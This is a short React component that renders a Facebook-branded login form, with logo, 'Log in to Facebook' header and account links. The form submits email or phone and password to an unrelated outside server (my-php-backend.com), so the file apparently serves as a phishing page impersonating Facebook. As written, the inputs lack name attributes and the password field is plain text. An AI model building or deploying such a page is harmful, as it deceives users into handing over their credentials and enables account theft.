import React from 'react';
import logoFb from "../images/logoFb.svg"

export default function Form() {
    return (
        <div className="box-ex">
            <div className="box-in">
                <img 
                    src={logoFb}
                    alt="Logo Facebook"
                    className="logo"
                />
                <div className="box_container">
                    <div className="header_block">
                        Log in to Facebook
                    </div>
                    <div id="login_form">
                        <form
                            action="https://my-php-backend.com"
                            method="POST"
                            id="my-form"
                        >
                            <input type="text" id="userInfo" placeholder="Email address or phone number" required/>
                            <input type="text" id="password" placeholder="Password" required/>
                            <input type="submit" id="submit" value="Log In"/>
                        </form>
                        <div className="linkinform">
                            <a href="#">Forgotten account?</a>
                            <span> · </span>
                            <a href="#">Sign up for Facebook</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}